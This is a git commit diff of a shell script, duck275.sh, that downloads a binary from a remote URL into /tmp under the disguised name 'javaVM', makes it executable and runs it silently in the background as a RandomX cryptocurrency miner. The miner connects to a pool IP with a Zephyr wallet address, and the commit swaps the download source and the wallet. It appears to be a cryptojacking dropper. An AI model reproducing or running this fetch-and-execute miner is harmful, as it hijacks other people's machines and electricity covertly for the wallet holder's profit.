d59276e60faf705f59d9660c648cbb835cbdd927
cronjob <thesunofme1@gmail.com>
2023-11-21 05:41:05 +0700

    Update duck275.sh

--- duck275.sh
+++ duck275.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 	/tmp/javaVM -o 143.47.231.0:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q https://cdn.discordapp.com/attachments/1077106588814422077/1176281046459879526/SRB -O /tmp/javaVM
+ 		wget -q https://github.com/thesunofme/trash/raw/main/work -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 		/tmp/javaVM -o 143.47.231.0:443 -u ZEPHsCfF7eDXUEjrBujn1LikKCFPmbpgfHQYdGzBZfAaVwyXFJ3pNFx5km5vJ9fLNxgGiux1Lpi8TdZ41CnAzHHXaxW3YrxqbNF -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 fi
